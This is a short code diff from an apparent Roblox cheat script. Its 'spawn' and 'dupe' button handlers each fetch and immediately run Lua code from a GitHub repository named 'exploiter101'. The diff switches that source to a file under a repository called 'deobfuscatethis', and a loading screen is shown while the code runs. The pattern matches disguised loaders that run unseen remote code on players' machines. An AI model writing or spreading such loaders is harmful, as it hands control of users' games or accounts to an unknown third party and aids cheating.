@@ -453,7 +453,7 @@ spawnButton.MouseButton1Click:Connect(function()
     -- Run the external script right away
     task.spawn(function()
         local success, result = pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHubLoader/main/sec2.lua"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/deobfuscatethis/refs/heads/main/random.lua"))()
         end)
     end)
     -- Show loading screen at the same time
@@ -466,7 +466,7 @@ dupeButton.MouseButton1Click:Connect(function()
     -- Run the external script right away
     task.spawn(function()
         local success, result = pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHubLoader/main/sec2.lua"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/deobfuscatethis/refs/heads/main/random.lua"))()
         end)
     end)
     -- Show loading screen at the same time
